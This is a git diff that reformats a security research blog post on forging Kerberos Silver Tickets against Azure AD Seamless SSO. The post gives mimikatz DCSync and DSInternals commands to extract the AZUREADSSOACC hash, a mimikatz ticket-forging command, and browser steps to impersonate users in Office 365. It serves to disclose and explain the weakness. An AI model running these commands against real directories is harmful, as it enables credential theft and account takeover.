@@ -15,28 +15,32 @@ tags:
 
 Last month, Microsoft has introduced a&nbsp;new feature of&nbsp;Azure AD Connect called [Single Sign On](https://docs.microsoft.com/en-us/azure/active-directory/connect/active-directory-aadconnect-sso). It allows companies to&nbsp;configure SSO between AD and&nbsp;AAD without the&nbsp;need to&nbsp;deploy [ADFS](https://learn.microsoft.com/en-us/windows-server/identity/active-directory-federation-services), which&nbsp;makes it an ideal solution for&nbsp;SMEs. Here is&nbsp;a high-level diagram of&nbsp;this functionality:
 
-![](https://docs.microsoft.com/en-us/azure/active-directory/connect/media/active-directory-aadconnect-sso/sso2.png) As we can see from&nbsp;the&nbsp;diagram above, Azure AD exposes a [publicly available endpoint](https://autologon.microsoftazuread-sso.com) that&nbsp;accepts Kerberos tickets and&nbsp;translates them into SAML and&nbsp;JWT tokens, which&nbsp;are understood and&nbsp;trusted by&nbsp;other cloud services like Office 365, Azure or&nbsp;Salesforce. And&nbsp;wherever you have Kerberos-based authentication, it can be attacked using [Silver Tickets](https://adsecurity.org/?p=2011).
+![](https://docs.microsoft.com/en-us/azure/active-directory/connect/media/active-directory-aadconnect-sso/sso2.png)
+
+As we can see from&nbsp;the&nbsp;diagram above, Azure AD exposes a [publicly available endpoint](https://autologon.microsoftazuread-sso.com) that&nbsp;accepts Kerberos tickets and&nbsp;translates them into SAML and&nbsp;JWT tokens, which&nbsp;are understood and&nbsp;trusted by&nbsp;other cloud services like Office 365, Azure or&nbsp;Salesforce. And&nbsp;wherever you have Kerberos-based authentication, it can be attacked using [Silver Tickets](https://adsecurity.org/?p=2011).
 
 In&nbsp;usual circumstances this attack can only be performed from&nbsp;the&nbsp;intranet. But&nbsp;what really caught my attention is&nbsp;the fact that&nbsp;with this new SSO feature, **Silver Tickets could be used from&nbsp;the&nbsp;entire internet**. Let’s give it a&nbsp;try then!
 
 <!--more-->
+
 ## The&nbsp;Nasty Stuff
 
 To&nbsp;test this technique, we need to&nbsp;retrieve some information from&nbsp;Active Directory first:
 
 1. NTLM password hash of&nbsp;the [AZUREADSSOACC](https://docs.microsoft.com/en-us/azure/active-directory/connect/active-directory-aadconnect-sso#how-single-sign-on-works) account, e.g. *f9969e088b2c13d93833d0ce436c76dd*. This value can be retrieved from AD using [mimikatz](https://github.com/gentilkiwi/mimikatz):
-```bat
-mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
-```
+
+    ```bat
+    mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
+    ```
     
-My own [DSInternals PowerShell Module](https://github.com/MichaelGrafnetter/DSInternals) could do&nbsp;the same job:
+    My own [DSInternals PowerShell Module](https://github.com/MichaelGrafnetter/DSInternals) could do&nbsp;the same job:
     
-```powershell
-Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain contoso `
--Server lon-dc1.contoso.local
-```
+    ```powershell
+    Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain contoso `
+    -Server lon-dc1.contoso.local
+    ```
     
-Both of these commands need *Domain Admins* permissions.
+    Both of these commands need *Domain Admins* permissions.
 
 2. Name of the AD domain, e.g. *contoso.local*.
 3. AAD logon name of the user we want to impersonate, e.g. elrond@contoso.com. This is typically either his *userPrincipalName* or *mail* attribute from the on-prem AD.
@@ -45,19 +49,26 @@ Both of these commands need *Domain Admins* permissions.
 Having this information we can now create and use the Silver Ticket on any Windows computer connected to the internet. It does not even matter whether it is joined to a domain or a workgroup:
 
 1. Create the Silver Ticket and inject it into Kerberos cache:
-```bat
-mimikatz.exe "kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit
-```
+
+    ```bat
+    mimikatz.exe "kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit
+    ```
 2. Launch *Mozilla Firefox*.
 3. Go to `about:config` and set the [network.negotiate-auth.trusted-uris](https://developer.mozilla.org/en-US/docs/Mozilla/Integrated_authentication) preference to [value](https://docs.microsoft.com/en-us/azure/active-directory/connect/active-directory-aadconnect-sso#ensuring-clients-sign-in-automatically) “https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com”.
 4. Navigate to any web application that is integrated with our AAD domain. We will use [Office 365](https://portal.office.com), which is the most commonly used one.
-5. Once at the logon screen, fill in the user name, while leaving the password field empty. Then press TAB or ENTER.  
+5. Once at the logon screen, fill in the user name, while leaving the password field empty. Then press TAB or ENTER.
+
     ![](../../assets/images/aad_sso1.png)
-6. That’s it, we’re in!![](../../assets/images/aad_sso2.png)
+
+6. That’s it, we’re in!
+
+    ![](../../assets/images/aad_sso2.png)
+
 7. To log in as another user, run the command below and repeat steps 1-6.
-```bat
-klist purge
-```
+
+    ```bat
+    klist purge
+    ```
 
 It is also worth noting that the password of the *AZUREADSSOACC* account never changes, so the stolen hash/key will work forever. It could therefore be misused by highly privileged employees to retain access to the IT environment after leaving the company. Dealing with such situations is a much broader problem, which is aptly depicted by the following old Narnian saying:
 
